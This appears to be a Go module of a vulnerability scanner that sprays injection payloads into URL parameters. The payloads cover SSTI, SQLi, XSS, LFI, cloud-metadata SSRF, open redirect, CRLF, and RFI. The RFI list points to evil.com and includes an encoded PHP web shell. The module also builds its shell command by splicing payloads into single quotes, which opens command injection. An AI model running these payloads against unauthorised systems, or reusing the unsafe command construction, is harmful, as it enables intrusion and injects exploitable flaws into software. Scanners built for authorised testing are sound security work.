package vulnscan

import (
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/rootsploit/reconator/internal/exec"
	"github.com/rootsploit/reconator/internal/historic"
	"github.com/rootsploit/reconator/internal/tools"
)

// BB-8: Modular Quick Test Framework
// Easily add new vulnerability tests by adding entries to quickTests slice

// QuickTest defines a single vulnerability test case
// To add a new test, just append to quickTests slice below
type QuickTest struct {
	Name        string   // Test name (e.g., "SSTI")
	GFPattern   string   // gf pattern to filter URLs (e.g., "ssti")
	Payloads    []string // Payloads to inject via qsreplace
	Matchers    []string // Strings to match in response (indicates vulnerability)
	Severity    string   // Severity level: critical, high, medium, low
	Description string   // Human-readable description
}

// quickTests defines all quick vulnerability tests
// ADD NEW TESTS HERE - just append a new QuickTest struct
var quickTests = []QuickTest{
	{
		Name:        "SSTI",
		GFPattern:   "ssti",
		Payloads:    []string{"{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "${{7*7}}", "{{constructor.constructor('return 7*7')()}}"},
		Matchers:    []string{"49"},
		Severity:    "high",
		Description: "Server-Side Template Injection",
	},
	{
		Name:        "SQLi-Error",
		GFPattern:   "sqli",
		Payloads:    []string{"'", "\"", "1'\"", "1 AND 1=1", "1' OR '1'='1", "1 UNION SELECT NULL--"},
		Matchers:    []string{"error", "syntax", "mysql", "ORA-", "PostgreSQL", "sqlite", "Warning", "SQLSTATE", "JDBC"},
		Severity:    "high",
		Description: "SQL Injection (Error-Based)",
	},
	{
		Name:        "XSS-Reflection",
		GFPattern:   "xss",
		Payloads:    []string{"<xss123>", "'\"><xss123>", "javascript:xss123", "<script>xss123</script>", "<img src=x onerror=xss123>"},
		Matchers:    []string{"<xss123>", "xss123", "<script>xss123"},
		Severity:    "medium",
		Description: "Cross-Site Scripting (Reflection Check)",
	},
	{
		Name:        "LFI",
		GFPattern:   "lfi",
		Payloads: []string{
			"....//....//....//etc/passwd",
			"..%2f..%2f..%2fetc/passwd",
			"..%252f..%252f..%252fetc/passwd", // Double encoding
			"%2e%2e/%2e%2e/%2e%2e/etc/passwd",
			"....\\....\\....\\windows\\win.ini", // Windows
			"..%5c..%5c..%5cwindows%5cwin.ini",
			"/etc/passwd%00",                       // Null byte
			"php://filter/convert.base64-encode/resource=/etc/passwd",
		},
		Matchers: []string{"root:x:", "root:*:", "/bin/bash", "/bin/sh", "[fonts]", "[extensions]"},
		Severity: "high",
		Description: "Local File Inclusion / Path Traversal",
	},
	{
		Name:        "SSRF",
		GFPattern:   "ssrf",
		Payloads: []string{
			"http://169.254.169.254/latest/meta-data/",
			"http://127.0.0.1:80",
			"http://localhost:80",
			"http://[::1]:80",
			"http://169.254.169.254/computeMetadata/v1/", // GCP
			"http://100.100.100.200/latest/meta-data/",   // Alibaba
		},
		Matchers:    []string{"ami-id", "instance-id", "security-credentials", "computeMetadata", "meta-data"},
		Severity:    "critical",
		Description: "Server-Side Request Forgery (Cloud Metadata)",
	},
	{
		Name:        "OpenRedirect",
		GFPattern:   "redirect",
		Payloads: []string{
			"//evil.com",
			"https://evil.com",
			"/\\evil.com",
			"////evil.com",
			"https:evil.com",
			"//evil%00.com",
			"//%09/evil.com",
			"/%2f%2fevil.com",
			"///evil.com/%2f%2e%2e",
		},
		Matchers:    []string{"Location: //evil", "Location: https://evil", "evil.com"},
		Severity:    "medium",
		Description: "Open Redirect",
	},
	{
		Name:        "RFI",
		GFPattern:   "lfi", // RFI URLs often overlap with LFI patterns
		Payloads: []string{
			"http://evil.com/shell.txt",
			"https://raw.githubusercontent.com/test/test.txt",
			"//evil.com/shell.txt",
			"ftp://evil.com/shell.txt",
			"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
		},
		Matchers:    []string{"shell", "test", "<?php"},
		Severity:    "critical",
		Description: "Remote File Inclusion",
	},
	{
		Name:        "CRLF",
		GFPattern:   "redirect", // CRLF often found in redirect parameters
		Payloads: []string{
			"%0d%0aSet-Cookie:crlf=injection",
			"%0aSet-Cookie:crlf=injection",
			"%0d%0a%0d%0a<html>crlf</html>",
			"\\r\\nSet-Cookie:crlf=injection",
		},
		Matchers:    []string{"Set-Cookie:crlf", "crlf=injection"},
		Severity:    "medium",
		Description: "CRLF Injection (HTTP Response Splitting)",
	},
}

// QuickTestResult holds results from quick testing
type QuickTestResult struct {
	Vulnerabilities []Vulnerability `json:"vulnerabilities"`
	TestsRun        int             `json:"tests_run"`
	Duration        time.Duration   `json:"duration"`
}

// QuickTester performs rapid vulnerability testing using gf + qsreplace + httpx
type QuickTester struct {
	checker *tools.Checker
	threads int
}

// NewQuickTester creates a new quick tester
func NewQuickTester(checker *tools.Checker, threads int) *QuickTester {
	return &QuickTester{checker: checker, threads: threads}
}

// RunQuickTests executes all quick tests on categorized URLs
func (qt *QuickTester) RunQuickTests(categorized *historic.CategorizedURLs) *QuickTestResult {
	start := time.Now()
	result := &QuickTestResult{}

	// Check required tools
	if !qt.checker.IsInstalled("qsreplace") {
		fmt.Println("        [QuickTest] qsreplace not installed, skipping quick tests")
		return result
	}
	if !qt.checker.IsInstalled("httpx") {
		fmt.Println("        [QuickTest] httpx not installed, skipping quick tests")
		return result
	}

	// Map gf pattern to categorized URLs
	urlsByPattern := map[string][]string{
		"ssti":     categorized.SSTI,
		"sqli":     categorized.SQLi,
		"xss":      categorized.XSS,
		"lfi":      categorized.LFI,
		"ssrf":     categorized.SSRF,
		"redirect": categorized.Redirect,
	}

	var wg sync.WaitGroup
	var mu sync.Mutex
	var allVulns []Vulnerability

	// Run tests in parallel (one goroutine per test type)
	for _, test := range quickTests {
		urls := urlsByPattern[test.GFPattern]
		if len(urls) == 0 {
			continue
		}

		wg.Add(1)
		go func(t QuickTest, testURLs []string) {
			defer wg.Done()

			vulns := qt.runSingleTest(t, testURLs)
			if len(vulns) > 0 {
				mu.Lock()
				allVulns = append(allVulns, vulns...)
				result.TestsRun++
				mu.Unlock()
				fmt.Printf("        [QuickTest] %s: %d potential vulnerabilities\n", t.Name, len(vulns))
			}
		}(test, urls)
	}

	wg.Wait()
	result.Vulnerabilities = allVulns
	result.Duration = time.Since(start)

	return result
}

// runSingleTest executes a single quick test
func (qt *QuickTester) runSingleTest(test QuickTest, urls []string) []Vulnerability {
	var vulns []Vulnerability

	// Limit URLs to prevent overwhelming
	maxURLs := 100
	if len(urls) > maxURLs {
		urls = urls[:maxURLs]
	}

	// Create temp file with URLs
	tmp, cleanup, err := exec.TempFile(strings.Join(urls, "\n"), "-quicktest.txt")
	if err != nil {
		return vulns
	}
	defer cleanup()

	// Test each payload
	for _, payload := range test.Payloads {
		// Build matcher string for httpx
		matcherArg := strings.Join(test.Matchers, "|")

		// Pipeline: cat urls | qsreplace <payload> | httpx -match-string <matchers>
		cmd := fmt.Sprintf(
			"cat %s | qsreplace '%s' | httpx -silent -mc 200,301,302 -mr '%s' 2>/dev/null",
			tmp, payload, matcherArg,
		)

		r := exec.Run("sh", []string{"-c", cmd}, &exec.Options{Timeout: 2 * time.Minute})
		if r.Error != nil {
			continue
		}

		// Parse results
		for _, line := range exec.Lines(r.Stdout) {
			if line == "" {
				continue
			}
			vulns = append(vulns, Vulnerability{
				URL:         line,
				TemplateID:  fmt.Sprintf("quicktest-%s", strings.ToLower(test.Name)),
				Name:        fmt.Sprintf("%s Detected", test.Name),
				Severity:    test.Severity,
				Type:        strings.ToLower(test.Name),
				Description: fmt.Sprintf("%s: Payload '%s' matched response pattern", test.Description, payload),
				Tool:        "quicktest",
			})
		}
	}

	return vulns
}

// GetAvailableTests returns list of all configured quick tests (for documentation)
func GetAvailableTests() []QuickTest {
	return quickTests
}

// AddCustomTest allows adding custom tests at runtime
// Example: AddCustomTest(QuickTest{Name: "Custom", GFPattern: "custom", ...})
func AddCustomTest(test QuickTest) {
	quickTests = append(quickTests, test)
}
